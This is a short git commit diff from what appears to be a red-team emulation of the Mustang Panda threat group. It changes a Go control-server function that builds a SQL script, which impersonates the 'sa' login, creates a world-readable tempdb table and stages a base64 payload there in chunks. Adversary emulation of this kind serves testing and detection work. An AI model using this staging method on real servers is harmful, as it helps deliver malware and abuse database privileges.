5457b6286fa7465ece2697441b4fb630ea8fd708
uetsymphonique <minhtran6464.lhp@gmail.com>
2026-08-21 00:01:41 +0700

    fix stage

--- mustang-panda-emulation/controlServer/mssql/mssql.go
+++ mustang-panda-emulation/controlServer/mssql/mssql.go
@@ -52,15 +52,16 @@ func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err er
 
 	var sb strings.Builder
 	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
-	sb.WriteString("IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;\n")
-	sb.WriteString("CREATE TABLE tempdb..stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
-	sb.WriteString("GRANT SELECT ON tempdb..stg TO PUBLIC;\n")
+	sb.WriteString("USE tempdb;\n")
+	sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
+	sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
+	sb.WriteString("GRANT SELECT ON stg TO PUBLIC;\n")
 	for i := 0; i < len(b64); i += chunkSize {
 		end := i + chunkSize
 		if end > len(b64) {
 			end = len(b64)
 		}
-		fmt.Fprintf(&sb, "INSERT INTO tempdb..stg(chunk) VALUES (N'%s');\n", b64[i:end])
+		fmt.Fprintf(&sb, "INSERT INTO stg(chunk) VALUES (N'%s');\n", b64[i:end])
 	}
 
 	if err = os.WriteFile(outPath, []byte(sb.String()), 0600); err != nil {
